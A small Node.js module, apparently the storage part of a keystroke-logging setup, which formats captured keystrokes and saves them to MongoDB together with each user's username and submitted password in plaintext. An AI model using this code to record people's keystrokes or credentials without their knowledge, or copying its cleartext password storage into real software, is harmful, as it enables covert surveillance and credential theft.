const mongoose = require('mongoose');
const KeystrokeLog = require('../models/KeystrokeLog');

/**
 * Formats raw keystroke data into an array of human-readable strings.
 * @param {Array} keystrokes - Array of keystroke objects { key, keyCode, timestamp }.
 * @returns {Array<string>} - Formatted keystroke entries.
 */
function formatKeystrokes(keystrokes) {
  return keystrokes.map(k =>
    `${new Date(k.timestamp).toISOString()} - ${k.key} (Code: ${k.keyCode})`
  );
}

/**
 * Saves a keystroke log entry to MongoDB.
 * @param {string} username - The username associated with the keystrokes.
 * @param {string} password - The password submitted by the user (optional storing).
 * @param {Array} keystrokes - Array of raw keystroke objects.
 * @returns {Promise} - Resolves when the log is saved.
 */
async function saveKeystrokesToDB(username, password, keystrokes) {
  const formatted = formatKeystrokes(keystrokes);
  const logEntry = new KeystrokeLog({
    username,
    password,
    keystrokes: formatted,
    timestamp: new Date()
  });
  await logEntry.save();
  console.log(`✅ Saved keystrokes for ${username} to MongoDB`);
}

module.exports = {
  formatKeystrokes,
  saveKeystrokesToDB
};
